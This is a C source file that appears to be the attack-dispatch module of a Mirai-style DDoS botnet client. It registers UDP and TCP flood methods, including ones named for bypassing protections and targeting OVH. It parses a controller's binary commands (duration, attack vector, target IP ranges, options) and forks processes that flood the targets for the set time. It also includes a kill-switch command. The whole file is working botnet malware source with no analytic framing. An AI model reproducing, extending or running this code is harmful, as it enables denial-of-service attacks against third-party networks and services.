#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "../headers/includes.h"
#include "../headers/attack.h"
#include "../headers/rand.h"
#include "../headers/util.h"

uint8_t methods_len = 0;
struct attack_method **methods = NULL;

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof(struct attack_method));
    method->vector = vector;
    method->func = func;
    methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method *));
    methods[methods_len++] = method;
}

BOOL attack_init(void)
{
    add_attack(ATK_VEC_UDP_PPS, (ATTACK_FUNC)attack_udp_pps);
    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_method_udpplain);
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_method_udpgeneric);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_method_udphex);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_method_udpvse);
    add_attack(ATK_VEC_RUDP, (ATTACK_FUNC)attack_method_rudp);
    add_attack(ATK_VEC_STDHEX, (ATTACK_FUNC)attack_method_stdhex);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_method_tcpack);
    add_attack(ATK_VEC_TCPBYPASS, (ATTACK_FUNC)attack_tcp_bypass);
    add_attack(ATK_VEC_OVH, (ATTACK_FUNC)attack_tcp_ovhhex);
    add_attack(ATK_VEC_BTK, (ATTACK_FUNC)NULL);
    return TRUE;
}

static void free_opts(struct attack_option *opts, int len)
{
    int i;
    if (opts == NULL)
        return;
    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}

void attack_parse(char *buf, size_t len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len = 0;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if (len < sizeof(uint32_t))
        goto cleanup;

    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    if (len == 0)
        goto cleanup;

    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    if (len == 0)
        goto cleanup;

    targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if (targs_len == 0)
        goto cleanup;

    if (len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
        goto cleanup;

    targs = calloc(targs_len, sizeof(struct attack_target));

    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof(ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    if (len < sizeof(uint8_t))
        goto cleanup;

    opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof(struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;
            if (len < sizeof(uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);
            if (len < sizeof(uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);
            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof(char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    // printf("Vec: %d, %d, %d\n", vector, targs_len, opts_len);

    if (vector == 6)
    {
        kill(Main_Pid, 9);
        kill(Main_Pid, 15);
        kill(-Main_Pid, 9);
        kill(-Main_Pid, 15);

        kill(getpid(), 9);
        kill(getpid(), 15);
        kill(getppid(), 9);
        kill(getppid(), 15);
        exit(0);
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);
cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int Attack_Pid = fork();
    if (Attack_Pid == -1 || Attack_Pid > 0)
        return;
    prctl(PR_SET_PDEATHSIG, SIGHUP);

    int WatchAttack_Pid = fork();
    prctl(PR_SET_PDEATHSIG, SIGHUP);

    if (WatchAttack_Pid == -1)
        exit(0);

    else if (WatchAttack_Pid == 0)
    {
        sleep(duration);
        kill(getppid(), 9);
        exit(0);
    }
    else
    {
        int i;
        for (i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }
        exit(0);
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }
    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}
